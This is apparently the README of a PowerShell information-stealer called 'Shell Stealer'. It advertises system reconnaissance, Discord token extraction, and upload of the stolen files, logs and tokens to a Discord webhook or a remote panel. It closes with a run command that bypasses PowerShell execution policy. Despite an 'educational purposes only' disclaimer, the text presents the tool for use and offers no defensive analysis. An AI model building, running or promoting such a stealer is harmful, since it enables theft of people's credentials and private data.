# 🐚 Shell Stealer – PowerShell-Based Information Stealer

> ⚠️ **For Educational Purposes Only**  
> This script demonstrates techniques used in information gathering, token extraction, and system profiling.

---

## 📄 Overview

`shell stealer.ps1` is a PowerShell-based script designed to collect sensitive system and user data from Windows environments. Its modular layout allows for flexible data collection, token harvesting, and optional surveillance features.

---

## ✨ Features

- 🧠 **System Recon**
  - Username, machine name, OS version, IP info, hardware data

- 🔐 **Token Extraction**
  - Discord tokens 

- 💬 **Remote Exfiltration**
  - Webhook-based data upload
  - Can send files, logs, tokens to Discord or a remote panel

---

## 🚀 How to Use

Run the script manually
```powershell
powershell -ExecutionPolicy Bypass -File "shell stealer.ps1"
